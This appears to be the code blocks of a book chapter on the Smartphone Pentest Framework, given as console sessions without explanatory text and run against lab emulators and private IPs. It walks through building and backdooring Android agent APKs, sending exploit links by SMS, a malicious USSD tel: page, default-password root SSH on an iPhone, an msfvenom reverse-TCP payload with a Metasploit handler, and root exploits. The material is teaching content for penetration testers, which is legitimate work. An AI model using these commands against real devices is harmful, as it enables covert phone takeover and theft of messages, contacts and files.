["```\nroot@kali:~/Smartphone-Pentest-Framework/frameworkconsole# **service apache2 start**\n```", "```\nroot@kali:~/Smartphone-Pentest-Framework/frameworkconsole# **service mysql start**\n```", "```\nroot@kali:~/Smartphone-Pentest-Framework/frameworkconsole# **cat config**\n#SMARTPHONE PENTEST FRAMEWORK CONFIG FILE\n#ROOT DIRECTORY FOR THE WEBSERVER THAT WILL HOST OUR FILES\nWEBSERVER = /var/www\n#IPADDRESS FOR WEBSERVER (webserver needs to be listening on this address)\nIPADDRESS = 192.168.20.9 ❶\n#IP ADDRESS TO LISTEN ON FOR SHELLS\nSHELLIPADDRESS = 192.168.20.9 ❷\n#IP ADDRESS OF SQLSERVER 127.0.0.1 IF LOCALHOST\nMYSQLSERVER = 127.0.0.1\n--*snip*--\n#NMAP FOR ANDROID LOCATION\nANDROIDNMAPLOC = /root/Smartphone-Pentest-Framework/nmap-5.61TEST4\n#EXPLOITS LOCATION\nEXPLOITSLOC = /root/Smartphone-Pentest-Framework/exploits\n```", "```\nroot@kali:~/Smartphone-Pentest-Framework/frameworkconsole# **./framework.py**\n################################################\n#                                              #\n# Welcome to the Smartphone Pentest Framework! #\n#                   v0.2.6                     #\n#         Georgia Weidman/Bulb Security        #\n#                                              #\n################################################\n\nSelect An Option from the Menu:\n\n     1.)  Attach Framework to a Deployed Agent/Create Agent\n     2.)  Send Commands to an Agent\n     3.)  View Information Gathered\n     4.)  Attach Framework to a Mobile Modem\n     5.)  Run a remote attack\n     6.)  Run a social engineering or client side attack\n     7.)  Clear/Create Database\n     8.)  Use Metasploit\n     9.)  Compile code to run on mobile devices\n    10.)  Install Stuff\n    11.)  Use Drozer\n     0.)  Exit\nspf>\n```", "```\nspf> **7**\nThis will destroy all your data. Are you sure you want to? (y/N)? **y**\n```", "```\nspf> **4**\n\nChoose a type of modem to attach to:\n    1.) Search for attached modem\n    2.) Attach to a smartphone based app\n    3.) Generate smartphone based app\n    4.) Copy App to Webserver\n    5.) Install App via ADB\nspf> **3**❶\n\nChoose a type of control app to generate:\n    1.) Android App (Android 1.6)\n    2.) Android App with NFC (Android 4.0 and NFC enabled device)\nspf> **1**❷\nPhone number of agent: **15555215556**❸\nControl key for the agent: **KEYKEY1**❹\nWebserver control path for agent: **/androidagent1**❺\n\nControl Number:15555215556\nControl Key:KEYKEY1\nControlPath:/bookspf\nIs this correct?(y/n)**y**\n--*snip*--\n-post-build:\n\ndebug:\n\nBUILD SUCCESSFUL\nTotal time: 10 seconds\n```", "```\nspf> **4**\n\nChoose a type of modem to attach to:\n    1.) Search for attached modem\n    2.) Attach to a smartphone based app\n    3.) Generate smartphone based app\n    4.) Copy App to Webserver\n    5.) Install App via ADB\nspf> **5**\n* daemon not running. starting it now on port 5037 *\n* daemon started successfully *\nList of devices attached\nemulator-5554     device\nemulator-5556     device\nemulator-5558     device\nChoose a device to install on: **emulator-5554**❶\nWhich App?\n\n    1.)Framework Android App with NFC\n\n    2.)Framework Android App without NFC\n\nspf> **2**❷\n1463 KB/s (46775 bytes in 0.031s)\n    pkg: /data/local/tmp/FrameworkAndroidApp.apk\nSuccess\n```", "```\nspf> **4**\n\nChoose a type of modem to attach to:\n    1.) Search for attached modem\n    2.) Attach to a smartphone based app\n    3.) Generate smartphone based app\n    4.) Copy App to Webserver\n    5.) Install App via ADB\nspf> **4**\nWhich App?\n    1.)Framework Android App with NFC\n    2.)Framework Android App without NFC\nspf> **2**❶\nHosting Path: **/bookspf2**❷\nFilename: **/app.apk**❸\n```", "```\nspf> **4**\n\nChoose a type of modem to attach to:\n    1.) Search for attached modem\n    2.) Attach to a smartphone based app\n    3.) Generate smartphone based app\n    4.) Copy App to Webserver\n    5.) Install App via ADB\nspf> **2**❶\n\nConnect to a smartphone management app. You will need to supply the phone number, the control key, and the URL path.\n\nPhone Number: **15555215554**❷\nControl Key: **KEYKEY1**❸\nApp URL Path: **/bookapp**❹\n\nPhone Number: 15555215554\nControl Key: KEYKEY1\nURL Path: /bookapp\nIs this correct?(y/N): **y**\n```", "```\nspf> **8**\nRuns smartphonecentric Metasploit modules for you.\n\nSelect An Option from the Menu:\n    1.) Run iPhone Metasploit Modules\n    2.) Create Android Meterpreter\n    3.) Setup Metasploit Listener\nspf> **1**\n\nSelect An Exploit:\n    1.) Cydia Default SSH Password\n    2.) Email LibTiff iOS 1\n    3.) MobileSafari LibTiff iOS 1\nspf> **1**\n\nLogs in with alpine on a jailbroken iPhone with SSH enabled.\niPhone IP address: **192.168.20.13**\n[*] Initializing modules...\nRHOST => 192.168.20.13\n[*] 192.168.20.13:22 - Attempt to login as 'root' with password 'alpine'\n[+] 192.168.20.13:22 - Login Successful with 'root:alpine'\n[*] Found shell.\n[*] Command shell session 1 opened (192.168.20.9:39177 -> 192.168.20.13:22) at 2015-03-21 14:02:44 -0400\n\n**ls**\nDocuments\nLibrary\nMedia\n--*snip*--\n```", "```\nspf> **6**\nChoose a social engineering or client side attack to launch:\n    1.) Direct Download Agent\n    2.) Client Side Shell\n    3.) USSD Webpage Attack (Safe)\n    4 ) USSD Webpage Attack (Malicious)\n\nspf> **2**❶\nSelect a Client Side Attack to Run\n\n    1) CVE=2010-1759 Webkit Vuln Android\n\nspf> **1**❷\nHosting Path: **/spfbook2**❸\nFilename: **/book.html**❹\n\nDelivery Method(SMS or NFC): **SMS**❺\nPhone Number to Attack: **15555215558**\nCustom text(y/N)? **N**\n```", "```\n15555215554: This is a cool page: http://192.168.20.9/spfbook2/book.html\n```", "```\nConnected: Try exit to quit\nuid=10002(app_2) gid=10002(app_2) groups=1015(sdcard_rw),3003(inet)\n**/system/bin/ls**\nsqlite_stmt_journals\n--*snip*--\n**exit**\n```", "```\n<html>\n<frameset>\n<frame src=\"tel:*2767*3855%23\" />\n</frameset>\n</html>\n```", "```\nspf> **6**\nChoose a social engineering or client side attack to launch:\n    1.) Direct Download Agent\n    2.) Client Side Shell\n    3.) USSD Webpage Attack (Safe)\n    4 ) USSD Webpage Attack (Malicious)\nspf> **3**❶\nHosting Path: **/spfbook2**\nFilename: **/book2.html**\nPhone Number to Attack: **15555215558**\n```", "```\nspf> **1**\n\nSelect An Option from the Menu:\n    1.) Attach Framework to a Deployed Agent\n    2.) Generate Agent App\n    3.) Copy Agent to Web Server\n    4.) Import an Agent Template\n    5.) Backdoor Android APK with Agent\n    6.) Create APK Signing Key\n\nspf> **2**❶\n    1.) MapsDemo\n    2.) BlankFrontEnd\n\nspf> **1**❷\nPhone number of the control modem for the agent: **15555215554**❸\nControl key for the agent: **KEYKEY1**❹\nWebserver control path for agent: **/androidagent1**❺\nControl Number:15555215554\nControl Key:KEYKEY1\nControlPath:/androidagent1\nIs this correct?(y/n) **y**\n--*snip*--\n\nBUILD SUCCESSFUL\n```", "```\nspf> **6**\n\nChoose a social engineering or client side attack to launch:\n    1.) Direct Download Agent\n    2.) Client Side Shell\n    3.) USSD Webpage Attack (Safe)\n    4 ) USSD Webpage Attack (Malicious)\n\nspf> **1**❶\nThis module sends an SMS with a link to directly download and install an Agent\nDeliver Android Agent or Android Meterpreter (Agent/meterpreter:) **Agent**❷\nHosting Path: **/spfbook3**❸\nFilename: **/maps.apk**\nDelivery Method:(SMS or NFC): **SMS**\nPhone Number to Attack: **15555215556**\nCustom text(y/N)? **N**\n```", "```\nspf> **1**\n\nSelect An Option from the Menu:\n    1.) Attach Framework to a Deployed Agent\n    2.) Generate Agent App\n    3.) Copy Agent to Web Server\n    4.) Import an Agent Template\n    5.) Backdoor Android APK with Agent\n    6.) Create APK Signing Key\n\nspf> **1**❶\nAttach to a Deployed Agent:\n\nThis will set up handlers to control an agent that has already been deployed.\n\nAgent URL Path: **/androidagent1**❷\nAgent Control Key: **KEYKEY1**❸\nCommunication Method(SMS/HTTP): **HTTP**❹\n\nURL Path: /androidagent1\nControl Key: KEYKEY1\nCommunication Method(SMS/HTTP): **HTTP**\nIs this correct?(y/N): **y**\n```", "```\nspf> **2**\nAvailable Agents:\n15555215556\n```", "```\nspf> **1**\n\nSelect An Option from the Menu:\n    1.) Attach Framework to a Deployed Agent\n    2.) Generate Agent App\n    3.) Copy Agent to Web Server\n    4.) Import an Agent Template\n    5.) Backdoor Android APK with Agent\n    6.) Create APK Signing Key\nspf> **5**\nAPKTool not found! Is it installed? Check your config file\nInstall Android APKTool(y/N)?\nspf> **y**\n\n--2015-12-04 12:28:21--  https://android-apktool.googlecode.com/files/apktool-install-linux-r05-ibot.tar.bz2\n--*snip*--\nPuts the Android Agent inside an Android App APK. The application runs normally with extra functionality\nAPK to Backdoor: **/root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk**\nI: Baksmaling...\n--*snip*--\n```", "```\nPhone number of the control modem for the agent: **15555215554**\nControl key for the agent: **KEYKEY1**\nWebserver control path for agent: **/androidagent1**\nControl Number: 15555215554\nControl Key:KEYKEY1\nControlPath:/androidagent1\nIs this correct?(y/n) **y**\n--*snip*--\n```", "```\nUse Android Master Key Vuln?(y/N): **y**\nArchive:  /root/Desktop/abcnews.apk\n--*snip*--\nInflating: unzipped/META-INF/CERT.RSA\n```", "```\nUse Android Master Key Vuln?(y/N): **n**\nPassword for Debug Keystore is android\nEnter Passphrase for keystore:\n--*snip*--\n  signing: resources.arsc\n```", "```\nspf> **2**\nView Data Gathered from a Deployed Agent:\nAvailable Agents:\n    1.) 15555215556\nSelect an agent to interact with or 0 to return to the previous menu.\nspf> **1**❶\nCommands:❷\n    1.) Send SMS\n    2.) Take Picture\n    3.) Get Contacts\n    4.) Get SMS Database\n    5.) Privilege Escalation\n    6.) Download File\n    7.) Execute Command\n    8.) Upload File\n    9.) Ping Sweep\n    10.) TCP Listener\n    11.) Connect to Listener\n    12.) Run Nmap\n    13.) Execute Command and Upload Results\n    14.) Get Installed Apps List\n    15.) Remove Locks (Android < 4.4)\n    16.) Upload APK\n    17.) Get Wifi IP Address\nSelect a command to perform or 0 to return to the previous menu\nspf> **14**❸\n    Gets a list of installed packages(apps) and uploads to a file.\nDelivery Method(SMS or HTTP): **HTTP**❹\n```", "```\nspf> **3**\nView Data Gathered from a Deployed Agent:\nAgents or Attacks? **Agents**❶\nAvailable Agents:\n    1.) 15555215556\nSelect an agent to interact with or 0 to return to the previous menu.\nspf> **1**❷\nData:\nSMS Database:\nContacts:\nPicture Location:\nRooted:\nPing Sweep:\nFile:\nPackages: package:com.google.android.location❸\n--*snip*--\npackage:com.android.providers.downloads\npackage:com.android.server.vpn\n```", "```\nCommands:\n--*snip*--\nSelect a command to perform or 0 to return to the previous menu\nspf> **1**❶\nSend an SMS message to another phone. Fill in the number, the message to send, and the delivery method(SMS or HTTP).\nNumber: **15555215558**\nMessage: **hiya Georgia**\nDelivery Method(SMS or HTTP) **SMS**\n```", "```\nspf> **10**\n\nWhat would you like to Install?\n    1.) Android SDKS\n    2.) Android APKTool\n    3.) Download Android Nmap\nspf> **3**\n\nDownload Nmap for Android(y/N)?\nspf> **y**\n```", "```\nSelect a command to perform or 0 to return to the previous menu\nspf> **12**\n\n    Download Nmap and port scan a host of range. Use any accepted format for target specification in Nmap\nNmap Target: **192.168.20.10**❶\nDelivery Method(SMS or HTTP) **HTTP**\n```", "```\n# Nmap 5.61TEST4 scan initiated Sun Sep  6 23:41:30 2015 as: /data/data/com.example.android.google\n.apis/files/nmap -oA /data/data/com.example.android.google.apis/files/nmapoutput 192.168.20.10\nNmap scan report for 192.168.20.10\nHost is up (0.0068s latency).\nNot shown: 992 closed ports\nPORT     STATE SERVICE\n21/tcp   open  ftp\n--*snip*--\n\n# Nmap done at Sun Sep  6 23:41:33 2015 -- 1 IP address (1 host up) scanned in 3.43 seconds\n```", "```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 -f c -b '\\x00\\x0a\\x0d\\x40'\n```", "```\nspf> **9**\n\nCompile code to run on mobile devices\n    1.) Compile C code for ARM Android\nspf> **1**❶\n\nCompiles C code to run on ARM based Android devices. Supply the C code file and the output filename\nFile to Compile: **/root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.c**❷\nOutput File: **/root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter**\n```", "```\nSelect a command to perform or 0 to return to the previous menu\nspf> **6**\n\n    Downloads a file to the phone. Fill in the file and the delivery method(SMS or HTTP).\nFile to download: **/root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter**\nDelivery Method(SMS or HTTP): **HTTP**\n```", "```\nmsf > **use multi/handler**\nmsf exploit(handler) > **set payload windows/meterpreter/reverse_tcp**\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > **set LHOST 192.168.20.9**\nLHOST => 192.168.20.9\nmsf exploit(handler) > **exploit**\n\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Starting the payload handler...\n```", "```\nSelect a command to perform or 0 to return to the previous menu\nspf> **7**\n\n    Run a command in the terminal. Fill in the command and the delivery method(SMS or HTTP).\n\nCommand: **warftpmeterpreter 192.168.20.10 21**❶\nDownloaded?: **yes**❷\nDelivery Method(SMS or HTTP): **HTTP**\n```", "```\nmeterpreter >\n```", "```\nCommands:\n--*snip*--\nSelect a command to perform or 0 to return to the previous menu\nspf> **5**\n    1.) Choose a Root Exploit\n    2.) Let SPF AutoSelect\n\nSelect an option or 0 to return to the previous menu\nspf> **2**❶\n    Try a privilege escalation exploit.\n\nChosen Exploit: rageagainstthecage❷\nDelivery Method(SMS or HTTP): **HTTP**❸\n```", "```\nRooted: RageAgainstTheCage\n```"]